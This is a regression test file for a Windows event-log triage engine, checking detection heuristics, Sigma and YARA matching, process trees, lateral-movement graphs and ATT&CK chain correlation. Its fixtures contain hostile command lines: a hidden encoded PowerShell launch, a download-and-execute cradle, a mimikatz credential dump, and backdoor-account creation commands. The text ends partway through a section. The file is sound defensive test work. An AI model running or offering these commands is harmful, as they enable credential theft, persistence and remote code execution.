/* ============================================================================
   EVTX Triage — engine.cjs regression harness
   Dependency-free. Run:  node test/engine.test.cjs
   Locks in current heuristics / Sigma / YARA / index behavior so later work
   (MITRE tags, risk scoring, correlation, dedup) can't silently regress it.
   ========================================================================== */
"use strict";
const Engine = require("../engine.cjs");

let passed = 0, failed = 0;
const fails = [];
function ok(cond, msg){ if(cond){ passed++; } else { failed++; fails.push(msg); } }
function eq(a, b, msg){ ok(a===b, msg+"  (got "+JSON.stringify(a)+", want "+JSON.stringify(b)+")"); }
function section(name){ /* grouping only */ }

/* ---- helpers ---- */
let _t = Date.parse("2024-03-01T00:00:00Z");
function rec(eventId, data, extra){
  const ts = new Date(_t).toISOString();
  return Object.assign({ ts, tms:_t, provider:"prov", eventId:String(eventId),
    computer:"HOST1", channel:"Security", data:data||{}, raw:"" }, extra||{});
}
function heur(rows){
  const m = new Map();               // idx -> Set(ruleId)
  for(const h of Engine.runHeuristics(rows)){ if(!m.has(h.idx))m.set(h.idx,new Set()); m.get(h.idx).add(h.ruleId); }
  return m;
}
function ruleIdsAll(rows){ const s=new Set(); for(const h of Engine.runHeuristics(rows)) s.add(h.ruleId); return s; }

/* =====================================================================
   1. HEURISTICS
   ===================================================================== */
(function testHeuristics(){
  // H-LOGCLEAR (1102/104)
  ok(ruleIdsAll([rec(1102,{})]).has("H-LOGCLEAR"), "1102 -> H-LOGCLEAR");
  ok(ruleIdsAll([rec(104,{})]).has("H-LOGCLEAR"), "104 -> H-LOGCLEAR");

  // H-BRUTE: >=10 failed logons from one external IP -> high
  const brute = [];
  for(let i=0;i<12;i++) brute.push(rec(4625,{IpAddress:"203.0.113.5", TargetUserName:"admin"}));
  const bh = Engine.runHeuristics(brute).filter(h=>h.ruleId==="H-BRUTE");
  ok(bh.length===12, "12x 4625 same ext IP -> H-BRUTE on all");
  ok(bh.every(h=>h.level==="high"), "H-BRUTE external is high");

  // private-IP brute is medium
  const brP = []; for(let i=0;i<12;i++) brP.push(rec(4625,{IpAddress:"10.0.0.9",TargetUserName:"admin"}));
  const bhP = Engine.runHeuristics(brP).filter(h=>h.ruleId==="H-BRUTE");
  ok(bhP.length && bhP.every(h=>h.level==="medium"), "internal brute is medium");

  // H-SPRAY: one IP against >=8 distinct accounts
  const spray = []; for(let i=0;i<8;i++) spray.push(rec(4625,{IpAddress:"198.51.100.7",TargetUserName:"user"+i}));
  ok(ruleIdsAll(spray).has("H-SPRAY"), ">=8 distinct users from one IP -> H-SPRAY");

  // H-ENCPS: encoded PowerShell
  ok(ruleIdsAll([rec(4688,{CommandLine:"powershell -nop -w hidden -enc SQBFAFgA"})]).has("H-ENCPS"), "encoded PS -> H-ENCPS");
  ok(ruleIdsAll([rec(4104,{ScriptBlockText:"IEX (New-Object Net.WebClient).DownloadString('http://x')"})]).has("H-ENCPS"), "downloadstring -> H-ENCPS");
  ok(!ruleIdsAll([rec(4688,{CommandLine:"notepad.exe file.txt"})]).has("H-ENCPS"), "benign cmd -> no H-ENCPS");

  // H-NEWSVC: suspicious path -> high, normal -> medium
  const svcHi = Engine.runHeuristics([rec(7045,{ServiceName:"x",ImagePath:"C:\\Windows\\Temp\\evil.exe"})]).filter(h=>h.ruleId==="H-NEWSVC");
  ok(svcHi.length && svcHi[0].level==="high", "service in temp -> H-NEWSVC high");
  const svcMe = Engine.runHeuristics([rec(7045,{ServiceName:"x",ImagePath:"C:\\Program Files\\App\\app.exe"})]).filter(h=>h.ruleId==="H-NEWSVC");
  ok(svcMe.length && svcMe[0].level==="medium", "normal service path -> H-NEWSVC medium");

  // H-EXTRDP: type-10 external logon
  ok(ruleIdsAll([rec(4624,{LogonType:"10",IpAddress:"203.0.113.9"})]).has("H-EXTRDP"), "type-10 ext -> H-EXTRDP");
  ok(!ruleIdsAll([rec(4624,{LogonType:"10",IpAddress:"10.1.2.3"})]).has("H-EXTRDP"), "type-10 internal -> no H-EXTRDP");

  // account / group
  ok(ruleIdsAll([rec(4720,{TargetUserName:"newguy"})]).has("H-NEWUSER"), "4720 -> H-NEWUSER");
  ok(ruleIdsAll([rec(4732,{})]).has("H-ADMINADD"), "4732 -> H-ADMINADD");

  // defender
  ok(ruleIdsAll([rec(1116,{})]).has("H-AVHIT"), "1116 -> H-AVHIT");
  ok(ruleIdsAll([rec(5001,{})]).has("H-AVOFF"), "5001 -> H-AVOFF");

  // H-KERBEROAST: >=10 RC4 TGS
  const kerb = []; for(let i=0;i<10;i++) kerb.push(rec(4769,{TicketEncryptionType:"0x17",ServiceName:"svc"+i}));
  ok(ruleIdsAll(kerb).has("H-KERBEROAST"), "10x RC4 4769 -> H-KERBEROAST");
  const kerbFew = []; for(let i=0;i<5;i++) kerbFew.push(rec(4769,{TicketEncryptionType:"0x17"}));
  ok(!ruleIdsAll(kerbFew).has("H-KERBEROAST"), "5x RC4 -> no H-KERBEROAST (below threshold)");

  // --- new (step 6) heuristics ---
  ok(ruleIdsAll([rec(4662,{Properties:"{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}",SubjectUserName:"attacker"})]).has("H-DCSYNC"), "4662 replication GUID -> H-DCSYNC");
  ok(!ruleIdsAll([rec(4662,{Properties:"{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}",SubjectUserName:"DC01$"})]).has("H-DCSYNC"), "4662 by machine account -> no H-DCSYNC");
  ok(ruleIdsAll([rec(10,{TargetImage:"C:\\Windows\\System32\\lsass.exe",SourceImage:"C:\\evil.exe",GrantedAccess:"0x1410"},{provider:"Microsoft-Windows-Sysmon"})]).has("H-LSASSDUMP"), "Sysmon10 lsass 0x1410 -> H-LSASSDUMP");
  ok(!ruleIdsAll([rec(10,{TargetImage:"C:\\Windows\\System32\\lsass.exe",GrantedAccess:"0x1000"})]).has("H-LSASSDUMP"), "Sysmon10 lsass benign access -> no H-LSASSDUMP");
  ok(ruleIdsAll([rec(7045,{ServiceName:"PSEXESVC",ImagePath:"C:\\Windows\\PSEXESVC.exe"})]).has("H-PSEXEC"), "7045 PSEXESVC -> H-PSEXEC");
  ok(ruleIdsAll([rec(4624,{LogonType:"9",LogonProcessName:"seclogo",TargetUserName:"bob"})]).has("H-PTH"), "4624 type9 seclogo -> H-PTH");
  ok(ruleIdsAll([rec(4698,{TaskName:"Updater",TaskContent:"<Command>powershell -enc AAAA</Command>"})]).has("H-SCHTASK"), "4698 suspicious task -> H-SCHTASK");
  ok(!ruleIdsAll([rec(4698,{TaskName:"Backup",TaskContent:"<Command>C:\\Program Files\\App\\backup.exe</Command>"})]).has("H-SCHTASK"), "4698 benign task -> no H-SCHTASK");

  // new heuristics carry ATT&CK tags
  const dc=Engine.runHeuristics([rec(4662,{Properties:"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",SubjectUserName:"x"})]).find(h=>h.ruleId==="H-DCSYNC");
  ok(dc && dc.tags.includes("attack.t1003.006"), "H-DCSYNC tagged T1003.006");
})();

/* Entity-scoring dedup: 500 repeats of one rule must not outweigh a single critical from another */
(function testEntityDedup(){
  const sc=Engine.makeEntityScorer();
  const r=data=>({data,tms:1,computer:"H"});
  for(let i=0;i<500;i++) sc.feed({level:"high",ruleId:"NOISE",tags:[]}, r({TargetUserName:"noisyuser"}));
  sc.feed({level:"critical",ruleId:"REAL",tags:["attack.t1003.001"]}, r({TargetUserName:"crituser"}));
  const res=sc.result();
  const noisy=res.find(e=>e.name==="noisyuser"), crit=res.find(e=>e.name==="crituser");
  // log2 dampening: 500 highs ~ 40*(1+~9)=~400; a lone critical=100. Noisy still higher but not 500x.
  ok(noisy.score < 40*500*0.2, "repeated-rule volume is dampened (score "+noisy.score+" << linear "+(40*500)+")");
  ok(noisy.score/crit.score < 8, "noisy user not absurdly above a single critical ("+(noisy.score/crit.score).toFixed(1)+"x)");
})();

/* =====================================================================
   2. SIGMA — field modifiers + conditions
   ===================================================================== */
function sig(doc){ const r=Engine.compileSigmaRule(doc); if(!r.rule) throw new Error("compile failed: "+JSON.stringify(r)); return r.rule; }
function testRec(rule, rec){ if(!rule._fulltext){} rec._fulltext = Engine.buildFulltext(rec); return rule.test(rec); }

(function testSigma(){
  // basic endswith + contains, condition 'selection'
  const r1 = sig({ title:"enc ps", level:"high",
    logsource:{category:"process_creation"},
    detection:{ selection:{ "Image|endswith":"\\powershell.exe", "CommandLine|contains":"-enc" }, condition:"selection" } });
  ok(testRec(r1, rec(4688,{Image:"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",CommandLine:"powershell -enc AAA"})), "sigma endswith+contains match");
  ok(!testRec(r1, rec(4688,{Image:"C:\\Windows\\notepad.exe",CommandLine:"powershell -enc AAA"})), "sigma endswith miss");
  eq(r1.level, "high", "sigma level parsed");

  // |all modifier (both must be present)
  const r2 = sig({ title:"all", detection:{ sel:{ "CommandLine|contains|all":["-enc","hidden"] }, condition:"sel" } });
  ok(testRec(r2, rec(1,{CommandLine:"x -enc y hidden z"})), "|all both present");
  ok(!testRec(r2, rec(1,{CommandLine:"x -enc y"})), "|all one missing -> no match");

  // startswith
  const r3 = sig({ title:"sw", detection:{ sel:{ "Image|startswith":"C:\\Users\\" }, condition:"sel" } });
  ok(testRec(r3, rec(1,{Image:"C:\\Users\\bob\\a.exe"})), "startswith match");
  ok(!testRec(r3, rec(1,{Image:"C:\\Windows\\a.exe"})), "startswith miss");

  // regex modifier
  const r4 = sig({ title:"re", detection:{ sel:{ "CommandLine|re":"\\b[0-9a-f]{32}\\b" }, condition:"sel" } });
  ok(testRec(r4, rec(1,{CommandLine:"hash 0123456789abcdef0123456789abcdef end"})), "|re match");
  ok(!testRec(r4, rec(1,{CommandLine:"no hash here"})), "|re miss");

  // cidr modifier
  const r5 = sig({ title:"cidr", detection:{ sel:{ "DestinationIp|cidr":"10.0.0.0/8" }, condition:"sel" } });
  ok(testRec(r5, rec(3,{DestinationIp:"10.5.6.7"})), "cidr in-range");
  ok(!testRec(r5, rec(3,{DestinationIp:"192.168.1.1"})), "cidr out-of-range");

  // numeric gt
  const r6 = sig({ title:"gt", detection:{ sel:{ "Level|gt":"3" }, condition:"sel" } });
  ok(testRec(r6, rec(1,{Level:"5"})), "gt match");
  ok(!testRec(r6, rec(1,{Level:"2"})), "gt miss");

  // base64 modifier
  const r7 = sig({ title:"b64", detection:{ sel:{ "CommandLine|base64":"whoami" }, condition:"sel" } });
  const b64 = Buffer.from("whoami","utf8").toString("base64");
  ok(testRec(r7, rec(1,{CommandLine:"blah "+b64+" blah"})), "base64 encoded literal match");

  // windash
  const r8 = sig({ title:"windash", detection:{ sel:{ "CommandLine|windash|contains":"-encodedcommand" }, condition:"sel" } });
  ok(testRec(r8, rec(1,{CommandLine:"pwsh /encodedcommand AAA"})), "windash slash variant match");

  // condition: and / or / not
  const rAnd = sig({ title:"and", detection:{ a:{ "EventID":"4688" }, b:{ "CommandLine|contains":"mimikatz" }, condition:"a and b" } });
  ok(testRec(rAnd, rec(4688,{CommandLine:"run mimikatz now"})), "cond a and b match");
  ok(!testRec(rAnd, rec(4688,{CommandLine:"benign"})), "cond a and b miss");
  const rOr = sig({ title:"or", detection:{ a:{ "CommandLine|contains":"foo" }, b:{ "CommandLine|contains":"bar" }, condition:"a or b" } });
  ok(testRec(rOr, rec(1,{CommandLine:"only bar"})), "cond or match");
  const rNot = sig({ title:"not", detection:{ sel:{ "EventID":"4624" }, filt:{ "TargetUserName":"SYSTEM" }, condition:"sel and not filt" } });
  ok(testRec(rNot, rec(4624,{TargetUserName:"bob"})), "cond and-not keeps bob");
  ok(!testRec(rNot, rec(4624,{TargetUserName:"SYSTEM"})), "cond and-not drops SYSTEM");

  // condition: '1 of sel*' and 'all of them'
  const rOneOf = sig({ title:"1of", detection:{ sel_a:{ "CommandLine|contains":"aaaa" }, sel_b:{ "CommandLine|contains":"bbbb" }, condition:"1 of sel*" } });
  ok(testRec(rOneOf, rec(1,{CommandLine:"has bbbb"})), "1 of sel* match");
  ok(!testRec(rOneOf, rec(1,{CommandLine:"has cccc"})), "1 of sel* miss");
  const rAllThem = sig({ title:"allthem", detection:{ a:{ "CommandLine|contains":"xxxx" }, b:{ "CommandLine|contains":"yyyy" }, condition:"all of them" } });
  ok(testRec(rAllThem, rec(1,{CommandLine:"xxxx and yyyy"})), "all of them match");
  ok(!testRec(rAllThem, rec(1,{CommandLine:"xxxx only"})), "all of them miss");

  // pipe-aggregation now compiles to an aggRule (windowed correlation), not skipped
  const cAgg = Engine.compileSigmaRule({ title:"bruteforce", level:"high",
    detection:{ sel:{ "EventID":"4625" }, timeframe:"5m", condition:"sel | count() by IpAddress > 5" } });
  ok(cAgg.aggRule && !cAgg.unsupported && !cAgg.rule, "pipe-aggregation compiles to aggRule");
  eq(cAgg.aggRule.agg.func, "count", "agg func parsed");
  eq(cAgg.aggRule.agg.groupBy, "IpAddress", "agg group-by parsed");
  eq(cAgg.aggRule.agg.threshold, 5, "agg threshold parsed");
  eq(cAgg.aggRule.timeframeMs, 300000, "timeframe 5m -> ms");

  // brute force: 6 failed logons from one IP within window -> exactly one burst hit
  const at=(s,d)=>rec(4625, d, { tms: Date.parse("2025-01-01T00:00:0"+s+"Z"), ts:"2025-01-01T00:00:0"+s+"Z" });
  const bf=[0,1,2,3,4,5].map(s=>at(s,{ IpAddress:"45.61.187.9", TargetUserName:"bob" }));
  const bfHits=Engine.runCorrelations(bf, [cAgg.aggRule]);
  let bfCount=0; for(const [,h] of bfHits) bfCount+=h.length;
  eq(bfCount, 1, "brute force fires exactly once per burst");
  ok(bfHits.has(5), "brute force hit attached to the threshold-crossing event");

  // 5 failures (== threshold, not >) -> no hit
  const bf5=[0,1,2,3,4].map(s=>at(s,{ IpAddress:"10.0.0.9" }));
  let bf5c=0; for(const [,h] of Engine.runCorrelations(bf5,[cAgg.aggRule])) bf5c+=h.length;
  eq(bf5c, 0, "below/at threshold -> no hit");

  // password spray: count(distinct user) by IP > 3
  const cSpray = Engine.compileSigmaRule({ title:"spray",
    detection:{ sel:{ "EventID":"4625" }, timeframe:"5m", condition:"sel | count(TargetUserName) by IpAddress > 3" } });
  const spray=["ann","bob","cyd","dan"].map((u,s)=>at(s,{ IpAddress:"8.8.8.8", TargetUserName:u }));
  let sprayC=0; for(const [,h] of Engine.runCorrelations(spray,[cSpray.aggRule])) sprayC+=h.length;
  eq(sprayC, 1, "password spray (distinct-count) fires");
  // same IP but only 2 distinct users repeated -> no spray
  const noSpray=["ann","ann","bob","bob"].map((u,s)=>at(s,{ IpAddress:"9.9.9.9", TargetUserName:u }));
  let nsC=0; for(const [,h] of Engine.runCorrelations(noSpray,[cSpray.aggRule])) nsC+=h.length;
  eq(nsC, 0, "distinct-count respects distinctness");

  // eidHints derived from EventID selection
  ok(r1.eidHints && r1.eidHints.has(4688), "eidHints from category process_creation includes 4688");
})();

/* =====================================================================
   2b. PROCESS-TREE RECONSTRUCTION
   ===================================================================== */
(function testProcTree(){
  // explorer -> cmd -> powershell(detected) ; explorer -> notepad ; orphan on host B
  const procs=[
    { idx:0, guid:"G-EXP", pguid:"", image:"explorer.exe", tms:100, host:"WS01", user:"bob" },
    { idx:1, guid:"G-CMD", pguid:"G-EXP", image:"cmd.exe", tms:200, host:"WS01", user:"bob" },
    { idx:2, guid:"G-PS",  pguid:"G-CMD", image:"powershell.exe", tms:300, host:"WS01", user:"bob", det:3 },
    { idx:3, guid:"G-NP",  pguid:"G-EXP", image:"notepad.exe", tms:150, host:"WS01", user:"bob" },
    { idx:4, guid:"G-ORP", pguid:"G-MISSING", pimage:"services.exe", image:"svchost.exe", tms:50, host:"DC01" },
  ];
  const t=Engine.buildProcessTree(procs);
  eq(t.count, 5, "all processes become nodes");
  eq(t.roots.length, 2, "two roots (explorer + orphaned svchost)");
  eq(JSON.stringify(t.hosts), JSON.stringify(["DC01","WS01"]), "hosts listed sorted");
  const exp=t.roots.find(r=>r.guid==="G-EXP");
  eq(exp.children.length, 2, "explorer has two children");
  eq(exp.children[0].image, "notepad.exe", "children sorted by time (notepad@150 before cmd@200)");
  const cmd=exp.children.find(c=>c.guid==="G-CMD");
  eq(cmd.children[0].image, "powershell.exe", "grandchild linked under cmd");
  eq(exp.subDet, 3, "detection severity propagates up the subtree");
  eq(cmd.subDet, 3, "cmd subtree carries the powershell detection");
  eq(exp.det, 0, "own det stays 0 while subDet reflects descendants");
  // guid-reuse / cycle guard: a parent created AFTER the child is not linked (would cycle)
  const cyc=Engine.buildProcessTree([
    { idx:0, guid:"A", pguid:"B", tms:200, host:"H" },
    { idx:1, guid:"B", pguid:"A", tms:100, host:"H" },
  ]);
  ok(cyc.roots.length>=1 && JSON.stringify(cyc).length<100000, "cycle guard keeps the forest acyclic");
})();

(function testLateralGraph(){
  const raw=[
    { from:"10.0.0.5", ftype:"ip", to:"WS01", ttype:"host", kind:"rdp", user:"alice", idx:1, tms:100, det:3 },
    { from:"10.0.0.5", ftype:"ip", to:"WS01", ttype:"host", kind:"rdp", user:"alice", idx:2, tms:200, det:0 },   // same edge, repeats
    { from:"WS01", ftype:"host", to:"DC01", ttype:"host", kind:"explicit-cred", user:"admin", idx:3, tms:300, det:0 },
    { from:"HOSTX", ftype:"host", to:"HOSTX", ttype:"host", kind:"network", user:"bob", idx:4, tms:400, det:0 },   // self-loop dropped
    { from:"", ftype:"host", to:"DC01", ttype:"host", kind:"ntlm", idx:5, tms:500, det:0 },                       // empty source dropped
  ];
  const g=Engine.buildLateralGraph(raw);
  eq(g.nodes.length, 3, "three distinct nodes (self-loop + empty edge dropped)");
  eq(g.edges.length, 2, "two aggregated edges");
  const e=g.edges.find(x=>x.from==="10.0.0.5"&&x.to==="WS01");
  eq(e.count, 2, "repeat movement collapses to one edge with count 2");
  eq(e.det, 3, "edge carries max detection severity");
  eq(e.kinds.rdp, 2, "per-technique counts kept");
  eq(JSON.stringify(e.samples), JSON.stringify([1,2]), "sample event indices captured");
  eq(e.firstTms, 100, "edge first timestamp"); eq(e.lastTms, 200, "edge last timestamp");
  const ip=g.nodes.find(n=>n.id==="10.0.0.5"); eq(ip.type, "ip", "ip node typed as ip");
  eq(ip.out, 2, "ip node has 2 outbound"); eq(ip.det, 3, "detection severity reaches the node");
  const dc=g.nodes.find(n=>n.id==="DC01"); eq(dc.in, 1, "DC01 has one inbound movement");
  eq(g.nodes[0].det, 3, "nodes sorted with highest-detection nodes first");
})();

/* =====================================================================
   3. YARA-LITE
   ===================================================================== */
(function testYara(){
  const { rules, errors } = Engine.compileYaraRules(`
    rule Demo_AnyOf {
      strings:
        $a = "malware"
        $b = "evilpayload"
      condition:
        any of them
    }
    rule Demo_AllOf {
      strings:
        $x = "alpha"
        $y = "bravo"
      condition:
        all of them
    }
    rule Demo_Count {
      strings:
        $c = "beacon"
      condition:
        #c > 2
    }
  `);
  ok(errors.length===0, "yara compiles with no errors ("+errors.join("; ")+")");
  const byName = Object.fromEntries(rules.map(r=>[r.name,r]));
  ok(byName.Demo_AnyOf.test("this has malware inside"), "yara any-of match");
  ok(!byName.Demo_AnyOf.test("totally clean"), "yara any-of miss");
  ok(byName.Demo_AllOf.test("alpha then bravo"), "yara all-of match");
  ok(!byName.Demo_AllOf.test("alpha only"), "yara all-of miss (one string)");
  ok(byName.Demo_Count.test("beacon beacon beacon"), "yara #c>2 match (3)");
  ok(!byName.Demo_Count.test("beacon beacon"), "yara #c>2 miss (2)");
})();

/* =====================================================================
   4. INDEX  vs  BRUTE-FORCE parity
   The Aho-Corasick prescreen index must produce identical hits to testing
   every rule against every record (respecting eidHints).
   ===================================================================== */
(function testIndexParity(){
  const rules = [
    sig({ id:"R1", title:"mimikatz cmd", level:"critical",
      detection:{ sel:{ "CommandLine|contains":"mimikatz" }, condition:"sel" } }),
    sig({ id:"R2", title:"psexec service", level:"high", logsource:{category:"process_creation"},
      detection:{ sel:{ "CommandLine|contains":"psexesvc" }, condition:"sel" } }),
    sig({ id:"R3", title:"powershell enc", level:"high",
      detection:{ sel:{ "CommandLine|contains|all":["powershell","-encodedcommand"] }, condition:"sel" } }),
    sig({ id:"R4", title:"rare dll", level:"medium",
      detection:{ sel:{ "TargetFilename|endswith":"\\suspiciousmodule.dll" }, condition:"sel" } }),
    sig({ id:"R5", title:"lsass access eid10", level:"high",
      detection:{ sel:{ "EventID":"10", "TargetImage|endswith":"\\lsass.exe" }, condition:"sel" } }),
  ];
  const rows = [
    rec(4688,{CommandLine:"C:\\tools\\mimikatz.exe sekurlsa::logonpasswords"}),
    rec(4688,{CommandLine:"psexesvc.exe -install"}),
    rec(4688,{CommandLine:"powershell.exe -nop -encodedcommand SQBFAFgA"}),
    rec(11,{TargetFilename:"C:\\Windows\\Temp\\suspiciousmodule.dll"}),
    rec(10,{TargetImage:"C:\\Windows\\System32\\lsass.exe",SourceImage:"C:\\evil.exe"}),
    rec(4624,{TargetUserName:"bob"}),                       // matches nothing
    rec(4688,{CommandLine:"powershell.exe -File clean.ps1"}), // partial (no -encodedcommand) -> R3 no
  ];

  // brute force reference (mirrors runRules eidHints gating)
  const brute = new Map();
  for(let i=0;i<rows.length;i++){ rows[i]._fulltext = Engine.buildFulltext(rows[i]); const eid=Number(rows[i].eventId);
    for(const r of rules){ if(r.eidHints && !r.eidHints.has(eid)) continue;
      if(r.test(rows[i])){ if(!brute.has(i))brute.set(i,new Set()); brute.get(i).add(r.id); } } }

  // indexed run
  const index = Engine.buildIndex(rules);
  const m = Engine.runRules(rows, rules, [], { index });
  const got = new Map();
  for(const [i,hits] of m){ const s=new Set(); for(const h of hits) s.add(h.ruleId); got.set(i,s); }

  // compare
  let same = brute.size===got.size;
  for(const [i,s] of brute){ const g=got.get(i); if(!g||g.size!==s.size){ same=false; break; }
    for(const id of s) if(!g.has(id)){ same=false; break; } }
  ok(same, "index hits == brute-force hits  (brute="+JSON.stringify([...brute].map(([i,s])=>[i,[...s]]))+", got="+JSON.stringify([...got].map(([i,s])=>[i,[...s]]))+")");

  // spot checks
  ok(got.get(0)&&got.get(0).has("R1"), "row0 mimikatz -> R1");
  ok(got.get(2)&&got.get(2).has("R3"), "row2 powershell+enc -> R3");
  ok(!(got.get(6)&&got.get(6).has("R3")), "row6 powershell w/o enc -> not R3");
  ok(got.get(4)&&got.get(4).has("R5"), "row4 lsass eid10 -> R5");
})();

/* =====================================================================
   5. MITRE ATT&CK mapping
   ===================================================================== */
(function testAttack(){
  // heuristics now carry attack.* tags
  const h = Engine.runHeuristics([rec(1102,{})]).find(x=>x.ruleId==="H-LOGCLEAR");
  ok(h && Array.isArray(h.tags) && h.tags.includes("attack.t1070.001"), "H-LOGCLEAR tagged T1070.001");

  // parseAttack extracts technique + tactic from tags
  const pa = Engine.parseAttack(["attack.credential-access","attack.t1558.003","attack.t1110"]);
  const ids = pa.techniques.map(t=>t.id).sort();
  ok(ids.join(",")==="T1110,T1558.003", "parseAttack techniques from tags ("+ids.join(",")+")");
  const kerb = pa.techniques.find(t=>t.id==="T1558.003");
  ok(kerb && kerb.name==="Kerberoasting" && kerb.tactic==="credential-access", "T1558.003 resolves name+tactic");
  ok(pa.tactics.includes("credential-access"), "parseAttack surfaces credential-access tactic");

  // tag parsers
  eq(Engine.techniqueFromTag("attack.t1059.001"), "T1059.001", "techniqueFromTag sub-technique");
  eq(Engine.techniqueFromTag("attack.execution"), null, "techniqueFromTag ignores tactic tag");
  eq(Engine.tacticFromTag("attack.defense_evasion"), "defense-evasion", "tacticFromTag underscore->hyphen");
  eq(Engine.tacticFromTag("attack.t1027"), null, "tacticFromTag ignores technique tag");

  // unknown technique id still returns (id as name, null tactic)
  const unk = Engine.parseAttack(["attack.t9999"]);
  ok(unk.techniques[0].id==="T9999" && unk.techniques[0].name==="T9999", "unknown technique falls back to id");

  // sub-technique inherits parent name lookup when exact id missing (T1003.999 -> T1003 ref)
  const sub = Engine.parseAttack(["attack.t1003.999"]);
  ok(sub.techniques[0].tactic==="credential-access", "unknown sub-technique inherits parent tactic");

  // uncurated technique inherits the rule's explicit tactic tag (Sigma carries both)
  const fb = Engine.parseAttack(["attack.discovery","attack.t9998"]);
  ok(fb.techniques[0].id==="T9998" && fb.techniques[0].tactic==="discovery", "uncurated technique inherits explicit tactic tag");
})();

/* =====================================================================
   6. ENTITY RISK SCORING
   ===================================================================== */
(function testEntities(){
  // extractEntities pulls users/hosts/ips and filters noise accounts
  const e = Engine.extractEntities({ TargetUserName:"alice", SubjectUserName:"SYSTEM", IpAddress:"203.0.113.9", DestinationIp:"10.0.0.5" }, "HOSTX");
  ok(e.users.includes("alice") && !e.users.includes("SYSTEM"), "extractEntities keeps alice, drops SYSTEM");
  ok(e.hosts.includes("HOSTX"), "extractEntities host from computer");
  ok(e.ips.includes("203.0.113.9") && e.ips.includes("10.0.0.5"), "extractEntities both ips");

  const sc = Engine.makeEntityScorer();
  const r = (data,tms)=>({data,tms,computer:data.Computer});
  // alice: one high + one critical, two techniques -> should outrank bob (one medium)
  sc.feed({level:"high",ruleId:"R1",tags:["attack.t1059.001"]}, r({TargetUserName:"alice"}, 1000));
  sc.feed({level:"critical",ruleId:"R2",tags:["attack.t1003.001"]}, r({TargetUserName:"alice"}, 2000));
  sc.feed({level:"medium",ruleId:"R3",tags:["attack.t1110"]}, r({TargetUserName:"bob"}, 1500));
  const res = sc.result();
  const alice = res.find(x=>x.type==="user"&&x.name==="alice");
  const bob = res.find(x=>x.type==="user"&&x.name==="bob");
  ok(alice && bob, "both users scored");
  ok(alice.score > bob.score, "alice (crit+high, 2 techniques) outranks bob (medium)");
  ok(alice.level==="critical", "alice max level critical");
  eq(alice.techniques.sort().join(","), "T1003.001,T1059.001", "alice technique set");
  eq(alice.hits, 2, "alice hit count");
  ok(res[0].name==="alice", "ranking puts alice first");
  ok(alice.firstTms===1000 && alice.lastTms===2000, "alice first/last timestamps");

  // topN limiting
  ok(sc.result(1).length===1, "result(topN) limits output");
})();

/* =====================================================================
   7. ATTACK-CHAIN CORRELATION
   ===================================================================== */
(function testChains(){
  const T0=Date.parse("2024-05-01T09:00:00Z");
  const min=m=>T0+m*60000;
  // HOST1: a progression across 3 tactics within one burst -> should form a chain
  const items=[
    {idx:1,tms:min(0),host:"HOST1",user:"alice",level:"medium",title:"enc ps",source:"heuristic",tags:["attack.execution","attack.t1059.001"]},
    {idx:2,tms:min(5),host:"HOST1",user:"alice",level:"high",title:"new service",source:"heuristic",tags:["attack.persistence","attack.t1543.003"]},
    {idx:3,tms:min(9),host:"HOST1",user:"alice",level:"high",title:"log cleared",source:"heuristic",tags:["attack.defense-evasion","attack.t1070.001"]},
    // HOST2: single tactic, low volume -> should NOT form a chain
    {idx:4,tms:min(2),host:"HOST2",user:"bob",level:"medium",title:"one thing",source:"heuristic",tags:["attack.discovery","attack.t1482"]},
    // HOST1 again but 3 hours later -> separate burst (gap), single tactic, not a chain
    {idx:5,tms:min(200),host:"HOST1",user:"alice",level:"low",title:"later",source:"heuristic",tags:["attack.discovery","attack.t1482"]},
  ];
  const chains=Engine.buildAttackChains(items,{gapMs:60*60*1000,minTactics:2});
  ok(chains.length===1, "exactly one chain formed ("+chains.length+")");
  const c=chains[0];
  eq(c.host,"HOST1","chain host");
  eq(c.count,3,"chain covers 3 detections (the first burst only, gap-split from step 5)");
  eq(c.steps.length,3,"three distinct-technique steps");
  ok(c.tactics.length===3, "chain spans 3 tactics");
  // tactics ordered by ATT&CK kill-chain order: execution < persistence < defense-evasion
  eq(c.tactics.join(","),"execution,persistence,defense-evasion","chain tactics kill-chain ordered");
  eq(c.name,"Execution → Persistence → Defense Evasion","chain named by progression");
  eq(c.level,"high","chain max severity");
  ok(c.users.includes("alice"),"chain attributes user");
  ok(c.startTms===min(0)&&c.endTms===min(9),"chain time bounds are the burst");

  // high-severity sustained burst on a single tactic still qualifies
  const burst=[];
  for(let i=0;i<4;i++) burst.push({idx:100+i,tms:min(i),host:"HOSTB",level:"critical",title:"lsass",source:"sigma",tags:["attack.credential-access","attack.t1003.001"]});
  const bc=Engine.buildAttackChains(burst,{minTactics:2});
  ok(bc.length===1 && bc[0].count===4, "single-tactic critical burst still forms a chain");
  ok(bc[0].steps.length===1 && bc[0].steps[0].count===4, "repeated same-technique hits collapse to one step ×4");

  // a chain that runs longer than MAX_SPAN is split into separate bursts
  const long=[];
  for(let d=0;d<3;d++){ long.push({idx:200+d*2,tms:min(d*24*60+1),host:"HOSTL",level:"high",title:"exec",source:"h",tags:["attack.execution","attack.t1059.001"]});
    long.push({idx:201+d*2,tms:min(d*24*60+2),host:"HOSTL",level:"high",title:"persist",source:"h",tags:["attack.persistence","attack.t1543.003"]}); }
  const lc=Engine.buildAttackChains(long,{maxSpanMs:24*60*60*1000});
  ok(lc.length>=2, "activity spanning >24h splits into multiple chains ("+lc.length+")");
})();

/* =====================================================================
   8. COMMAND-LINE ARTIFACT EXTRACTION (smart Evidence)
   ===================================================================== */
(function testProcArtifacts(){
  const P=Engine.parseProcessArtifacts.bind(Engine);
  // local account creation
  eq(P('net user hacker P@ss123 /add').accounts[0].user, "hacker", "net user /add -> account");
  eq(P('C:\\Windows\\System32\\net1 user svc_evil pass /add /domain').accounts[0].user, "svc_evil", "net1 user /add");
  eq(P('powershell New-LocalUser -Name backdoor -NoPassword').accounts[0].user, "backdoor", "New-LocalUser -> account");
  ok(P('net user').accounts.length===0, "bare 'net user' (enumerate) -> no account");
  // privileged group add
  { const g=P('net localgroup Administrators hacker /add').groups[0]; ok(g&&g.group==="Administrators"&&g.member==="hacker", "net localgroup /add -> group+member"); }
  { const g=P('Add-LocalGroupMember -Group "Administrators" -Member evil').groups[0]; ok(g&&g.member==="evil", "Add-LocalGroupMember -> member"); }
  // scheduled task
